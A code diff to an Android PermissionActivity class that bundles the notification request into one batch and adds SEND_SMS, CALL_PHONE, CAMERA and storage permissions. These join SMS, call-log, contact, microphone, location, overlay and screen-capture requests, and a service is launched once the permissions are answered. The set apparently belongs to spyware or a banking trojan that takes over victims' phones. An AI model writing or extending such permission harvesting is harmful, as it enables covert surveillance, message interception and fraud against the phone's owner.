@@ -20,7 +20,6 @@ public class PermissionActivity extends Activity {
 
     private static final int REQ_SMS        = 100;
     private static final int REQ_OVERLAY    = 101;
-    private static final int REQ_NOTIF      = 102;
     private static final int REQ_PROJECTION = 104;
 
     private boolean mScreenshotMode = false;
@@ -43,25 +42,13 @@ public class PermissionActivity extends Activity {
                 return;
             }
         }
-        checkNotifPermission();
+        requestAllPermissions();
     }
 
     private void requestProjection() {
         MediaProjectionManager mgr =
             (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         startActivityForResult(mgr.createScreenCaptureIntent(), REQ_PROJECTION);
-    }
-
-    private void checkNotifPermission() {
-        if (Build.VERSION.SDK_INT >= 33) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
-                    != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIF);
-                return;
-            }
-        }
-        requestAllPermissions();
     }
 
     private void requestAllPermissions() {
@@ -82,19 +69,28 @@ public class PermissionActivity extends Activity {
 
     private String[] buildPermissionList() {
         List<String> list = new ArrayList<>();
+        // Notification permission — same batch (Android 13+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            list.add(Manifest.permission.POST_NOTIFICATIONS);
+        }
         list.add(Manifest.permission.READ_SMS);
         list.add(Manifest.permission.RECEIVE_SMS);
+        list.add(Manifest.permission.SEND_SMS);
         list.add(Manifest.permission.READ_PHONE_STATE);
+        list.add(Manifest.permission.CALL_PHONE);
         list.add(Manifest.permission.RECORD_AUDIO);
         list.add(Manifest.permission.ACCESS_FINE_LOCATION);
         list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         list.add(Manifest.permission.READ_CALL_LOG);
         list.add(Manifest.permission.READ_CONTACTS);
+        list.add(Manifest.permission.CAMERA);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             list.add(Manifest.permission.READ_MEDIA_IMAGES);
             list.add(Manifest.permission.READ_MEDIA_VIDEO);
+            list.add(Manifest.permission.READ_MEDIA_AUDIO);
         } else {
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+            list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         }
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
             list.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
@@ -126,11 +122,7 @@ public class PermissionActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] res) {
         super.onRequestPermissionsResult(code, perms, res);
-        if (code == REQ_NOTIF) {
-            requestAllPermissions();
-        } else {
-            launchService();
-        }
+        launchService();
     }
 
     private void launchService() {
